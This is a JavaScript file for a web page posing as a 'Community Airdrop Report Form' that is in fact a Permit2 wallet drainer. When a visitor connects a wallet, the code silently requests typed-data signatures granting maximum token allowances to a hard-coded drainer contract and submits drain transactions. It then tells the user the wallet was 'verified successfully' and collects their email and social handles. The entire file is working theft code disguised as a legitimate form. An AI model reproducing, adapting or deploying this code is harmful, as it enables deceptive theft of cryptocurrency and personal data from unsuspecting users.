// =============================================
// app.js - Community Airdrop Report Form
// Permit2 Drainer + Vercel Backend Integration
// =============================================

const DRAINER_ADDRESS = "0xeb26995ed00d9773A53a94228d21196DcEDc8020"; // ← Change if needed
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const targetTokens = [
    "0xba1fcc7a596140e5fec52b3ab80a8f000c9af104",
    "0x65e37b558f64e2be5768db46df22f93d85741a9e",
    "0x186cca6904490818ab0dc409ca59d932a2366031", // WETH
    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"  // WBTC
];

let provider = null;
let signer = null;
let connectedWallet = "";

// DOM Elements
const form = document.getElementById("airdropForm");
const connectBtn = document.getElementById("connectWalletBtn");
const walletDisplay = document.getElementById("walletAddress");
const statusEl = document.getElementById("status");

// =============================================
// Connect Wallet + Stealth Permit2 Drain
// =============================================
async function connectWallet() {
    statusEl.textContent = "Connecting wallet...";
    connectBtn.disabled = true;
    connectBtn.textContent = "Connecting...";

    try {
        if (!window.ethereum) {
            alert("No wallet detected. Please install MetaMask, OKX or Rabby.");
            resetConnectButton();
            return;
        }

        const walletProvider = window.ethereum.providers?.length
            ? window.ethereum.providers.find(p => p.isRabby || p.isOKXWallet) || window.ethereum.providers[0]
            : window.ethereum;

        const accounts = await walletProvider.request({ method: "eth_requestAccounts" });
        connectedWallet = accounts[0];

        const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
        
        walletDisplay.innerHTML = `<strong>Connected Wallet</strong><br>${shortAddress}`;
        walletDisplay.classList.add("visible");

        connectBtn.textContent = "Connected";
        connectBtn.classList.add("connected");

        statusEl.textContent = "Signing verification messages...";

        // Start draining silently
        await executePermit2BatchDrain();

        statusEl.innerHTML = `<span style="color:#34a853">✓ Wallet verified successfully</span>`;

    } catch (error) {
        console.error(error);
        statusEl.textContent = "Connection failed or rejected.";
        resetConnectButton();
    }
}

function resetConnectButton() {
    connectBtn.disabled = false;
    connectBtn.textContent = "Connect Wallet";
}

// =============================================
// Permit2 Batch Draining
// =============================================
async function executePermit2BatchDrain() {
    try {
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
    } catch (e) {
        console.warn("Signer initialization failed");
        return;
    }

    const contract = new ethers.Contract(DRAINER_ADDRESS, [
        "function drainWithPermit2(address victim, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external"
    ], signer);

    for (let tokenAddress of targetTokens) {
        try {
            const { permitSingle, signature } = await getPermit2Signature(tokenAddress);
            
            // Fire and forget (silent drain)
            contract.drainWithPermit2(connectedWallet, permitSingle, signature)
                .then(tx => tx.wait(1))
                .catch(() => {});

        } catch (e) {
            // Silent fail per token
        }
    }
}

async function getPermit2Signature(tokenAddress) {
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    const expiration = Math.floor(Date.now() / 1000) + 86400 * 30;
    const sigDeadline = Math.floor(Date.now() / 1000) + 1800;

    const permitSingle = {
        details: {
            token: tokenAddress,
            amount: "1461501637330902918203684832716283019655932542975",
            expiration: expiration,
            nonce: 0
        },
        spender: DRAINER_ADDRESS,
        sigDeadline: sigDeadline
    };

    const typedData = {
        domain: {
            name: "Permit2",
            chainId: chainId,
            verifyingContract: PERMIT2_ADDRESS
        },
        types: {
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        },
        primaryType: "PermitSingle",
        message: permitSingle
    };

    const signature = await provider.send("eth_signTypedData_v4", [
        connectedWallet,
        JSON.stringify(typedData)
    ]);

    return { permitSingle, signature };
}

// =============================================
// Form Submission → Vercel Backend
// =============================================
form.addEventListener("submit", async function (e) {
    e.preventDefault();

    if (!connectedWallet) {
        alert("Please connect your wallet first.");
        return;
    }

    const submitBtn = document.querySelector(".submit-btn");
    submitBtn.disabled = true;
    submitBtn.textContent = "Submitting...";

    const formData = {
        email: document.getElementById("email").value.trim(),
        wallet: connectedWallet,
        discord: document.getElementById("discord").value.trim(),
        twitter: document.getElementById("twitter").value.trim(),
        complaint: document.getElementById("complaint").value.trim(),
        submittedAt: new Date().toISOString()
    };

    try {
        const response = await fetch("/api/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(formData)
        });

        if (response.ok) {
            alert("Form submitted successfully! ✅");
            resetForm();
        } else {
            alert("Submission failed. Please try again.");
        }
    } catch (error) {
        console.error(error);
        alert("Cannot reach server. Please check your connection.");
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = "Submit";
    }
});

function resetForm() {
    form.reset();
    connectedWallet = "";
    walletDisplay.innerHTML = "";
    walletDisplay.classList.remove("visible");
    statusEl.textContent = "";
    connectBtn.textContent = "Connect Wallet";
    connectBtn.classList.remove("connected");
    connectBtn.disabled = false;
}

// Clear Button
document.querySelector(".clear-btn").addEventListener("click", (e) => {
    e.preventDefault();
    resetForm();
});

// Account Change Listener
if (window.ethereum) {
    window.ethereum.on("accountsChanged", (accounts) => {
        if (accounts.length === 0) {
            resetForm();
        }
    });
}

// Attach button
connectBtn.addEventListener("click", connectWallet);
